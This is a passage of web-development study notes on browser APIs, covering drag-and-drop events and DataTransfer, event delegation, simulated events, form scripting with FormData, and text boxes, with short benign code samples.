<ul><li>By default, only text selections, images, and links can be dragged</li> <li>Set the <code>draggable</code> attribute to true on the element that you wish to make draggable</li> <li>Add a listener for the <code>dragstart</code> event</li> <li>Set the drag data using <code>DataTransfer.setData()</code> within the listener defined above</li></ul></li> <li>inherits: <code>MouseEvent</code></li> <li>constructor: <code>DragEvent(type: string, eventInitDict?: DragEventInit)</code> <ul><li>it is not possible to create a useful <code>DataTransfer</code> object from script, since <code>DataTransfer</code> objects have a processing and security model that is coordinated by the browser during drag-and-drops</li></ul></li> <li>properties
<ul><li><code>DragEvent.dataTransfer: DataTransfer</code> Read only — The data that is transferred during a drag and drop interaction.</li></ul></li></ul></li> <li><p>Event Types of <code>DragEvent</code></p> <ul><li><code>dragstart</code> — The user starts dragging an element or text selection</li> <li><code>drag</code> — An element or text selection is being dragged (fired continuously with different intervals according to cursor movement)</li> <li><code>dragend</code> — A drag operation is being ended (by releasing a mouse button or hitting the escape key)</li> <li><code>dragenter</code> — A dragged element or text selection enters a valid drop target
<ul><li>Default Action: Reject immediate user selection as potential target element</li> <li>buggy, people use <code>dragover</code> to allow the drop</li></ul></li> <li><code>dragover</code> — An element or text selection is being dragged over a valid drop target (fired continuously with different intervals according to cursor movement)
<ul><li><code>preventDefault()</code> to allow drop when not allowed</li></ul></li> <li><code>dragleave</code> — A dragged element or text selection leaves a valid drop target</li> <li><code>drop</code> — An element is dropped on a valid drop target
<ul><li>last chance to retrieve <code>DataTransfer</code>???</li></ul></li></ul></li> <li><p><code>DataTransfer</code></p> <ul><li>hold the data that is being dragged during a drag and drop operation</li> <li>only in the handler for <code>dragstart</code>, associated <code>DataTransfer</code> is writeable</li> <li>constructor: <code>DataTransfer()</code></li> <li>properties
<ul><li><code>DataTransfer.dropEffect</code> — Gets the type of drag-and-drop operation currently selected or sets the operation to a new type. Only affect cursor style. The value must be
<ul><li><code>copy</code> — A copy of the source item is made at the new location</li> <li><code>move</code> — An item is moved to a new location</li> <li><code>link</code> — A link is established to the source at the new location</li> <li><code>none</code> — The item may not be dropped</li> <li>Assigning any other value to dropEffect has no effect and the old value is retained</li> <li>example: <a href="https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer/dropEffect#Example" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><code>DataTransfer.effectAllowed</code> — Provides all of the types of operations that are possible. Must be one of
<ul><li><code>none</code> — The item may not be dropped</li> <li><code>copy</code> — A copy of the source item may be made at the new location</li> <li><code>copyLink</code> — A copy or link operation is permitted</li> <li><code>copyMove</code> — A copy or move operation is permitted</li> <li><code>link</code> — A link may be established to the source at the new location</li> <li><code>linkMove</code> — A link or move operation is permitted</li> <li><code>move</code> — An item may be moved to a new location</li> <li><code>all</code> — All operations are permitted</li> <li><code>uninitialized</code> — The default value when the effect has not been set, equivalent to <code>all</code></li> <li>Assigning any other value to <code>effectAllowed</code> has no effect and the old value is retained</li> <li>IE will change the value to be lowercased</li></ul></li> <li><code>DataTransfer.files</code> — Contains a <code>FileList</code> of all the local files available on the data transfer
<ul><li>If the drag operation doesn't involve dragging files, this property is an empty list</li> <li><a href="https://developer.mozilla.org/en-US/docs/DOM/File" target="_blank" rel="noopener noreferrer"><code>File</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><code>DataTransfer.items</code> Read only — Gives a <code>DataTransferItemList</code> object which is a list of all of the drag data</li> <li><code>DataTransfer.types</code> Read only — An array of strings giving the formats that were set in the <code>dragstart</code> event
<ul><li>MIME type such as <code>text/plain</code> and <code>text/uri-list</code>, or less common legacy type as <code>&quot;text&quot;</code>, <code>&quot;Text&quot;</code>, <code>&quot;url&quot;</code></li></ul></li></ul></li> <li>methods
<ul><li><code>DataTransfer.clearData(format?: string)</code> — Remove the data associated with a given type
<ul><li>If the type is <code>''</code> or not specified, the data associated with all types is removed</li> <li>If data for the specified type does not exist, or the data transfer contains no data, this method will have no effect</li></ul></li> <li><code>DataTransfer.getData(format: string): string</code> — Retrieves the data for a given type, or an empty string if data for that type does not exist or the data transfer contains no data</li> <li><code>DataTransfer.setData(format: string, data: string)</code> — Set the data for a given type
<ul><li>If data for the type does not exist, it is added at the end, such that the last item in the types list will be the new format</li> <li>If data for the type already exists, the existing data is replaced in the same position</li></ul></li> <li><code>DataTransfer.setDragImage(image: Element, x: number, y: number)</code> — Set the image to be used for dragging if a custom one is desired
<ul><li>img: <code>HTMLImageElement</code>, <code>HTMLCanvasElement</code> etc.</li> <li>x, y: offsets where the image should appear relative to the mouse pointer</li></ul></li></ul></li></ul></li> <li><p><code>DataTransferItemList</code></p> <ul><li>no IE support, poor support of other browsers as well</li> <li>a list of <code>DataTransferItem</code> objects representing items being dragged</li> <li>properties
<ul><li><code>DataTransferItemList.length</code></li></ul></li> <li>methods
<ul><li><code>DataTransferItemList.add(data: file): DataTransferItem</code><br> <code>DataTransferItemList.add(data: string, type: string): DataTransferItem</code> — Adds an item (either a File object or a string) to the drag item list and returns a DataTransferItem object for the new item</li> <li><code>DataTransferItemList.remove(index: number): void</code> — Removes the drag item from the list at the given index</li> <li><code>DataTransferItemList.clear(): void</code> — Removes all of the drag items from the list</li> <li><code>DataTransferItemList.item(index)</code> — Getter that returns a DataTransferItem at the given index
<ul><li>also bracket notation</li></ul></li></ul></li></ul></li> <li><p><code>DataTransferItem</code></p> <ul><li>no IE and Safari support</li> <li>represents one drag data item</li> <li>properties
<ul><li><code>DataTransferItem.kind</code> Read only — The kind of drag data item, string or file</li> <li><code>DataTransferItem.type</code> Read only — The drag data item's type, typically a MIME type</li></ul></li> <li>methods
<ul><li><code>DataTransferItem.getAsFile(): File</code> — Returns the File object associated with the drag data item (or null if the drag item is not a file)</li> <li><code>DataTransferItem.getAsString(callback: (data: string) =&gt; void): void</code> — Invokes the specified callback with the drag data item string as its argument</li></ul></li></ul></li></ol> <h3 id="memory-and-performance"><a href="#memory-and-performance" class="header-anchor">#</a> Memory and Performance</h3> <ol><li><p>the number of event handlers on the page directly relates to the overall performance of the page</p> <ul><li>not like languages that create GUIs, such as C#</li> <li>The first is that each function is an object and takes up memory; the more objects in memory, the slower the performance</li> <li>Second, the amount of DOM access needed to assign all of the event handlers up front delays the interactivity of the entire page</li></ul></li> <li><p>Event Delegation</p> <ul><li>The solution to the “too many event handlers” issue</li> <li>takes advantage of event bubbling to assign a single event handler to manage all events of a particular type
<ul><li><code>switch</code> according to <code>id</code>, <code>name</code> or <code>class</code> of <code>Event.target</code></li></ul></li> <li>All events that use buttons (most mouse events and keyboard events) are candidates for this technique
<ul><li>The <code>mouseover</code> and <code>mouseout</code> events bubble but are complicated to handle properly</li></ul></li> <li>on <code>document</code> <ul><li>The document object is immediately available and can have event handlers assigned at any point during the page’s life cycle (no need to wait for <code>DOMContentLoaded</code> or <code>load</code> events). This means that as soon as a clickable element is rendered, it can function appropriately without delay.</li></ul></li></ul></li> <li><p>remove event handlers when they are no longer needed</p> <ul><li>when <code>Node.removeChild()</code> or <code>Node.replaceChild()</code>, but especially <code>Element.innerHTML</code></li> <li>removing the element in the event handler prevents bubbling of the event. An event will bubble only if its target is still present in the document</li> <li>IE8 and earlier: remove all event handlers <code>onunload</code></li></ul></li></ol> <h3 id="simulate-events"><a href="#simulate-events" class="header-anchor">#</a> Simulate Events</h3> <ol><li><p>how-to: new way, no IE support</p> <ol><li>create event using event constructor
<ul><li>typeArg can be custom</li> <li><code>Event.isTrusted</code> is <code>false</code></li> <li>To add more data to the event object, the <code>CustomEvent</code> interface exists and the <code>detail</code> property can be used to pass custom data</li> <li><code>Event('click', {bubbles: true})</code> will behave as <code>preventDefault()</code>, whereas <code>MouseEvent('click', {bubbles: true})</code> will keep default behavior and have corresponding properties
<ul><li>for example, <code>Event('click', {bubbles: true})</code> on a hyperlink will not navigate the page while the other one will</li></ul></li></ul></li> <li>listen for the event
<ul><li>see before</li></ul></li> <li>dispatch event: <code>EventTarget.dispatchEvent(evt: Event): boolean</code> <ul><li>The return value is <code>false</code> if event is cancelable and at least one of the event handlers which handled this event called <code>Event.preventDefault()</code> <ul><li>Otherwise it returns <code>true</code></li></ul></li> <li>throws <code>UNSPECIFIED_EVENT_TYPE_ERR</code> if the event's type was not specified, or is <code>null</code> or empty string</li> <li>Unlike &quot;native&quot; events, which are fired by the DOM and invoke event handlers asynchronously via the <a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/" target="_blank" rel="noopener noreferrer">event loop<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, dispatchEvent invokes event handlers synchronously</li></ul></li></ol></li> <li><p><code>HTMLElement</code> method</p> <ul><li><code>HTMLElement.blur()</code> — Removes keyboard focus from the currently focused element</li> <li><code>HTMLElement.click()</code> — Sends a mouse click event to the element</li> <li><code>HTMLElement.focus()</code> — Makes the element the current keyboard focus</li></ul></li> <li><p>The old-fashioned way</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token comment">// Create the event.</span>
<span class="token keyword">var</span> event <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createEvent</span><span class="token punctuation">(</span><span class="token string">'Event'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Define that the event name is 'build'.</span>
event<span class="token punctuation">.</span><span class="token function">initEvent</span><span class="token punctuation">(</span><span class="token string">'build'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Listen for the event.</span>
elem<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'build'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// e.target matches elem</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// target can be any Element or other EventTarget.</span>
elem<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>specific event type</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;myBtn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//create event object</span>
<span class="token keyword">var</span> event <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createEvent</span><span class="token punctuation">(</span><span class="token string">&quot;MouseEvents&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//initialize the event object</span>
event<span class="token punctuation">.</span><span class="token function">initMouseEvent</span><span class="token punctuation">(</span><span class="token string">&quot;click&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> document<span class="token punctuation">.</span>defaultView<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
<span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//fire the event</span>
btn<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li> <li><p>The way for IE8 and earlier</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;myBtn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//create event object</span>
<span class="token keyword">var</span> event <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createEventObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//initialize the event object</span>
event<span class="token punctuation">.</span>screenX <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
event<span class="token punctuation">.</span>screenY <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
event<span class="token punctuation">.</span>clientX <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
event<span class="token punctuation">.</span>clientY <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
event<span class="token punctuation">.</span>ctrlKey <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
event<span class="token punctuation">.</span>altKey <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
event<span class="token punctuation">.</span>shiftKey <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
event<span class="token punctuation">.</span>button <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token comment">//fire the event</span>
btn<span class="token punctuation">.</span><span class="token function">fireEvent</span><span class="token punctuation">(</span><span class="token string">&quot;onclick&quot;</span><span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li></ol> <h2 id="scripting-forms"><a href="#scripting-forms" class="header-anchor">#</a> Scripting Forms</h2> <h3 id="form-basics"><a href="#form-basics" class="header-anchor">#</a> Form Basics</h3> <ol><li><p><code>&lt;form&gt;</code>, <code>HTMLFormElement</code></p> <ul><li><code>document.forms[index]</code>, <code>document.forms[id]</code>, <code>document.forms[name]</code></li> <li>Named inputs are added to their owner form instance as properties
<ul><li>can overwrite native properties if they share the same name</li> <li>eg a form with an input named action will have its <code>action</code> property return that input instead of the form's <code>action</code> HTML attribute</li></ul></li> <li>properties
<ul><li><code>HTMLFormElement.elements</code> Read only — A <code>HTMLFormControlsCollection</code> holding all form controls belonging to this form element
<ul><li><code>&lt;button&gt;</code> <code>&lt;fieldset&gt;</code> <code>&lt;object&gt;</code> <code>&lt;output&gt;</code> <code>&lt;select&gt;</code> <code>&lt;textarea&gt;</code></li> <li><code>&lt;input&gt;</code> (with the exception that any whose <code>type</code> is <code>&quot;image&quot;</code> are omitted for historical reasons)</li></ul></li> <li><code>HTMLFormElement.length</code> Read only — A <code>long</code> reflecting the number of controls in the form</li> <li><code>HTMLFormElement.name</code> — A <code>DOMString</code> reflecting the value of the form's <code>name</code> HTML attribute, containing the name of the form</li> <li><code>HTMLFormElement.method</code> — A <code>DOMString</code> reflecting the value of the form's <code>method</code> HTML attribute, indicating the HTTP method used to submit the form. Only specified values can be set</li> <li><code>HTMLFormElement.target</code> — A DOMString reflecting the value of the form's <code>target</code> HTML attribute, indicating where to display the results received from submitting the form</li> <li><code>HTMLFormElement.action</code> — A DOMString reflecting the value of the form's <code>action</code> HTML attribute, containing the URI of a program that processes the information submitted by the form</li> <li><code>HTMLFormElement.encoding</code> or <code>HTMLFormElement.enctype</code> — A <code>DOMString</code> reflecting the value of the form's <code>enctype</code> HTML attribute, indicating the type of content that is used to transmit the form to the server. Only specified values can be set. The two properties are synonyms</li> <li><code>HTMLFormElement.acceptCharset</code> — A <code>DOMString</code> reflecting the value of the form's accept-charset HTML attribute, representing the character encoding that the server accepts</li> <li><code>HTMLFormElement.autocomplete</code> — A <code>DOMString</code> reflecting the value of the form's <code>autocomplete</code> HTML attribute, indicating whether the controls in this form can have their values automatically populated by the browser</li> <li><code>HTMLFormElement.noValidate</code> — A Boolean reflecting the value of the form's <code>novalidate</code> HTML attribute, indicating whether the form should not be validated</li></ul></li> <li>methods
<ul><li><code>HTMLFormElement.submit()</code> — Submits the form to the server
<ul><li>no <code>submit</code> event is raised (in particular, the form's <code>onsubmit</code> event handler is not run)</li> <li>and constraint validation is not triggered either</li> <li>If a form control (such as a submit button) has a name or id of submit it will mask the form's submit method</li></ul></li> <li><code>HTMLFormElement.reset()</code> — Resets the form to its initial state
<ul><li>does not reset other attributes in the input, such as <code>disabled</code></li> <li>fires the <code>reset</code> event</li></ul></li> <li><code>HTMLFormElement.checkValidity()</code> — Returns <code>true</code> if the element's child controls are subject to constraint validation and satisfy those constraints; returns <code>false</code> if some controls do not satisfy their constraint
<ul><li>Fires an event named <code>invalid</code> at any control that does not satisfy its constraint
<ul><li>such controls are considered invalid if the event is not canceled</li></ul></li> <li>It is up to the programmer to decide how to respond to `false</li></ul></li> <li><code>HTMLFormElement.reportValidity()</code> — Returns <code>true</code> if the element's child controls satisfy their validation constraint
<ul><li>When <code>false</code> is returned, cancelable <code>invalid</code> events are fired for each invalid child and validation problems are reported to the use</li></ul></li></ul></li></ul></li> <li><p>Submitting Forms</p> <ul><li>submit buttons<div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- generic submit button --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Submit Form<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- custom submit button --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Submit Form<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- image button --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>image<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>graphic.gif<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>when clicked, will submit a form in which the button resides</li> <li>pressing <code>Enter</code> on the keyboard while a form control has focus will also submit the form
<ul><li>The one exception is a <code>textarea</code>, within which Enter creates a new line of text</li></ul></li></ul></li> <li><code>submit()</code> method: see before</li> <li>the <code>submit</code> event fires right before the request is sent to the server
<ul><li>interface: <code>Event</code></li> <li>the opportunity to validate the form data and decide whether to allow the form submission to occur (<code>preventDefault()</code>)</li> <li>address the possibility of submitting the form twice</li></ul></li> <li>An html <code>&lt;form&gt;</code> can be sent in four ways:
<ul><li>using the POST method and setting the <code>enctype</code> attribute to <code>application/x-www-form-urlencoded</code> (default)</li> <li>using the POST method and setting the <code>enctype</code> attribute to <code>text/plain</code></li> <li>using the POST method and setting the <code>enctype</code> attribute to <code>multipart/form-data</code></li> <li>using the GET method (in this case the <code>enctype</code> attribute will be ignored)</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest#Using_nothing_but_XMLHttpRequest" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li>Ajax: see after</li></ul></li> <li><p>Resetting Forms</p> <ul><li>often disorienting to the user and, when triggered accidentally, can be quite frustrating</li> <li>reset button<div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- generic reset button --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>reset<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Reset Form<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- custom reset button --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>reset<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Reset Form<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre></div>all of the form fields are set back to default value</li> <li><code>reset()</code> method: see before</li> <li>the <code>reset</code> event fires after the reset button is pressed
<ul><li>gives you the opportunity to cancel the reset if necessary</li></ul></li></ul></li> <li><p>Form-Field Properties</p> <ul><li><code>&lt;fieldset&gt;</code> <ul><li><code>disabled</code> — If this Boolean attribute is set, all form controls that are descendants of the <code>&lt;fieldset&gt;</code>, are disabled
<ul><li>meaning they are not editable and won't be submitted along with the <code>&lt;form&gt;</code></li> <li>They won't receive any browsing events, like mouse clicks or focus-related events</li> <li>By default browsers display such controls grayed out. Note that form elements inside a descendant <code>&lt;legend&gt;</code> element won't be disabled</li></ul></li> <li><code>form</code> HTML5 — This attribute takes the value of the <code>id</code> attribute of a <code>&lt;form&gt;</code> element you want the <code>&lt;fieldset&gt;</code> to be part of
<ul><li>even if it is not inside the form</li> <li>If not specified, its default value is the <code>id</code> of the nearest <code>&lt;form&gt;</code> element it is a descendant of</li></ul></li> <li><code>name</code> HTML5 — The name associated with the group</li></ul></li> <li>common form-field properties
<ul><li><code>&lt;button&gt;</code> <code>&lt;object&gt;</code> <code>&lt;output&gt;</code> <code>&lt;select&gt;</code> <code>&lt;textarea&gt;</code> <code>&lt;input&gt;</code> (only with certain field types)</li> <li><code>disabled</code></li> <li><code>form</code></li> <li><code>name</code></li> <li><code>type</code></li> <li><code>value</code> — The value of the field that will be submitted to the server. For file-input fields, this property is read only and simply contains the file’s path on the computer.</li> <li><code>autofocus</code> HTML5</li></ul></li></ul></li> <li><p>Common Form-Field Events — <code>change</code></p> <ul><li>fired for <code>&lt;input&gt;</code>, <code>&lt;select&gt;</code>, and <code>&lt;textarea&gt;</code> elements when a change to the element's value is committed by the user
<ul><li>When the element is activated (by clicking or using the keyboard) for <code>&lt;input type=&quot;radio&quot;&gt;</code> and <code>&lt;input type=&quot;checkbox&quot;&gt;</code></li> <li>When the user commits the change explicitly (e.g. by selecting a value from a <code>&lt;select&gt;</code>'s dropdown with a mouse click, by selecting a date from a date picker for <code>&lt;input type=&quot;date&quot;&gt;</code>, by selecting a file in the file picker for <code>&lt;input type=&quot;file&quot;&gt;</code>, etc.)</li> <li>When the element loses focus after its value was changed, but not committed (e.g. after editing the value of <code>&lt;textarea&gt;</code> or <code>&lt;input type=&quot;text&quot;&gt;</code>)</li></ul></li> <li>interface: <code>Event</code></li> <li>order of <code>blur</code> and <code>change</code>: not strictly defined???</li></ul></li> <li><p><code>FormData</code></p> <ul><li>provides a way to easily construct a set of key/value pairs representing form fields and their values
<ul><li>name: string</li> <li>value: <code>USVString</code>, <code>Blob</code> (<code>File</code>)</li></ul></li> <li>cannot apply <code>JSON.stringify()</code></li> <li>It uses the same format a form would use if the encoding type were set to <code>&quot;multipart/form-data&quot;</code></li> <li><code>for (var p of myFormData)</code> is equivalent to <code>for (var p of myFormData.entries())</code></li> <li>constructor: <code>FormData(form?: HTMLFormElement)</code></li> <li>methods
<ul><li><code>FormData.append(name, value, filename?: string): void</code> — Appends a new value onto an existing key inside a FormData object, or adds the key if it does not already exist</li> <li><code>FormData.delete(name): void</code> — Deletes a key/value pair from a FormData object</li> <li><code>FormData.entries(): IterableIterator&lt;[string, FormDataEntryValue]&gt;</code> — Returns an <code>iterator</code> allowing to go through all key/value pairs contained in this object</li> <li><code>FormData.get(name): FormDataEntryValue</code> — Returns the first value associated with a given key from within a FormData object</li> <li><code>FormData.getAll(name): FormDataEntryValue[]</code> — Returns an array of all the values associated with a given key from within a FormData</li> <li><code>FormData.has(name): boolean</code> — Returns a boolean stating whether a FormData object contains a certain key/value pair</li> <li><code>FormData.keys(): IterableIterator&lt;string&gt;</code> — Returns an <code>iterator</code> allowing to go through all keys of the key/value pairs contained in this object</li> <li><code>FormData.set(name, value, filename?: string): void</code> — Sets a new value for an existing key inside a FormData object, or adds the key/value if it does not already exist</li> <li><code>FormData.values(): IterableIterator&lt;FormDataEntryValue&gt;</code> — Returns an <code>iterator</code> allowing to go through all values of the key/value pairs contained in this object</li></ul></li></ul></li></ol> <h3 id="scripting-text-boxes"><a href="#scripting-text-boxes" class="header-anchor">#</a> Scripting Text Boxes</h3> <ol><li><p>text boxes</p> <ul><li><code>&lt;input&gt;</code><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>25<span class="token punctuation">&quot;</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>50<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>initial value<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li><code>&lt;textarea&gt;</code><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>25<span class="token punctuation">&quot;</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>5<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>initial value<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li>access value: <code>value</code> property</li></ul></li> <li><p>interface: <code>HTMLInputElement</code></p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>Text Selection
